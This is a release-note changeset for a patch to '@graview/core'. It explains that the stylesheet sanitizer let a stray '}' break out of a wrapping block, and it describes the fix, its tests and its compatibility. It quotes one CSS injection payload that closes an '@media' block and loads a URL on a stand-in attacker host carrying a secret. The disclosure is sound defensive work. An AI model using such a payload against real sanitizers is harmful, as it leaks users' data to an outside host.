---
"@graview/core": patch
---

A stylesheet the sanitizer keeps can no longer close a block it is put inside. `judgeCondition` and `judgeSelector` let a stray `}`, a `;` and, in a condition, an at-keyword through, so `@media }div{background-image:url("https://evil.test/a?d=secret");z{}}` was kept with nothing refused. Drawn at the top of a sheet that is junk in a prelude, and no engine fetched anything: `graview.style`, `brand.views.css`, a drawn `<style>`, a `style` attribute and the view check's audit page each sent no request in Chromium, WebKit or Firefox. Put inside any block, the `}` closes it and what follows is CSS nobody judged, which fetched the address in all three. So a host that wraps `sanitizeStylesheet`'s output, or a headless run's `css`, in a cascade layer or an `@media` of its own could be made to send what a view reads. A condition and a selector now hold no `}`, `;`, at-keyword, `<!--`, `-->`, lone backslash or unmatched bracket at any depth, and a value holds no unmatched bracket. Each is refused and said (`unreadable`), and `graview check` warns of it in `brand.views.css` (`brand-views-css`). A sheet that wrote one of these lost nothing it drew: the browser dropped that rule already. Test: `a-judged-stylesheet-cannot-close-what-holds-it` (core), over the sheets in `scripts/fixtures/sheets-that-try-to-leave-their-layer.mjs`.

Compatibility: ops and primitives — unchanged. Stored formats — unchanged. The wire — unchanged. The declaration and check finding codes — unchanged; `brand-views-css` now also says these. Derived tool names and input schemas — unchanged.

What Graview Cloud does: if it puts a sanitized sheet or a headless run's `css` inside a larger block anywhere, take this release promptly, and check any sheet stored before it.
